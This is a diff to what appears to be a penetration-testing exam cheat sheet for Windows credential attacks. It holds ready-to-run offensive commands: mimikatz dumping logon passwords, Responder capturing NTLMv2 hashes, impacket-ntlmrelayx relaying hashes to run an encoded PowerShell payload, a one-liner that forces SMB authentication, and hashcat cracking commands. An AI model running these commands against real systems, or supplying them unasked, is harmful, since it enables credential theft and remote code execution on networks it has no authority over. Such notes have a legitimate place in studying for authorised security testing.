@@ -3,6 +3,17 @@ Run mimikatz non-interactively:
 ```powershell
 .\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
 ```
+Forced authentication (Does not require high privileges, aquires NTLMv2 Hashes)
+```bash
+sudo responder -A -I tun0
+```
+> Do not forget the `-A`, otherwise responder could use features that are not allowed in the exam!
+
+NTLMv2 contains a timestamp, but uncrackable hashes can still be relayed if the relayed user is local admin on the target or the latter has UAC remote restrictions disabled:
+```bash
+impacket-ntlmrelayx --no-http-server -smb2support -t $hip -c "powershell -enc JABjAGwAaQBlAG4AdA..."
+```
+In both cases, you need to connect to your kali with SMB to get the NTLMv2 hashes. For example by abusing a web application on the target or with `dir \\$tip\test` executed on it.
 # Convert
 passwd -> john
 ```
@@ -35,6 +46,10 @@ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr
 NTLM Hash
 ```bash
 sudo hashcat -m 1000 NTLMHashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+NTLMv2 Hash
+```bash
+sudo hashcat -m 5600 NTLMv2Hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 NT Hash
 ```bash
